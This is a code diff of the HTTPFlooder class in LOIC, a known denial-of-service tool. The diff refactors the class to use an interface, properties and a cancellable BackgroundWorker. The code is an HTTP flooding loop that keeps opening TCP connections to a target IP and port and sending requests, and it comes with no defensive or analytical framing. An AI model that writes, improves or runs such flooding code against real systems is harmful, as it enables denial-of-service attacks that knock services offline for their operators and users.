@@ -8,22 +8,24 @@ using System.ComponentModel;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.Windows.Forms;
 
 namespace LOIC
 {
-	public class HTTPFlooder
+	public class HTTPFlooder : IFlooder
 	{
-		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
+		public bool IsFlooding { get; set; }
+		public int Delay       { get; set; }
+
 		public ReqState State = ReqState.Ready;
 		public int Downloaded;
 		public int Requested;
 		public int Failed;
-		public bool IsFlooding;
-		public int Delay;
 
-		private System.Windows.Forms.Timer tTimepoll;
+		private BackgroundWorker bw;
+		private Timer tTimepoll;
 		private bool intShowStats;
-		private long LastAction;
+		private long lastAction;
 
 		private readonly string Host;
 		private readonly string IP;
@@ -48,29 +50,32 @@ namespace LOIC
 		}
 		public void Start()
 		{
-			IsFlooding = true; LastAction = Tick();
+			this.IsFlooding = true;
 
-			tTimepoll = new System.Windows.Forms.Timer();
+			lastAction = Tick();
+			tTimepoll = new Timer();
 			tTimepoll.Tick += tTimepoll_Tick;
 			tTimepoll.Start();
 
-			BackgroundWorker bw = new BackgroundWorker();
-			bw.DoWork += bw_DoWork;
-			bw.RunWorkerAsync();
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
 		}
 		public void Stop()
 		{
-			IsFlooding = false;
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
 		}
 		void tTimepoll_Tick(object sender, EventArgs e)
 		{
 			if(intShowStats) return; intShowStats = true;
 
-			if(Tick() > LastAction + Timeout)
+			if(Tick() > lastAction + Timeout)
 			{
 				Failed++; State = ReqState.Failed;
 				tTimepoll.Stop();
-				if(IsFlooding)
+				if(this.IsFlooding)
 					tTimepoll.Start();
 			}
 
@@ -81,10 +86,10 @@ namespace LOIC
 			try
 			{
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
-				while (IsFlooding)
+				while (this.IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
-					LastAction = Tick();
+					lastAction = Tick();
 					byte[] recvBuf = new byte[128];
 					using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 					{
@@ -117,7 +122,7 @@ _continue:
 			}
 			// Analysis disable once EmptyGeneralCatchClause
 			catch { }
-			finally { tTimepoll.Stop(); State = ReqState.Ready; IsFlooding = false; }
+			finally { tTimepoll.Stop(); State = ReqState.Ready; this.IsFlooding = false; }
 		}
 		private static long Tick()
 		{
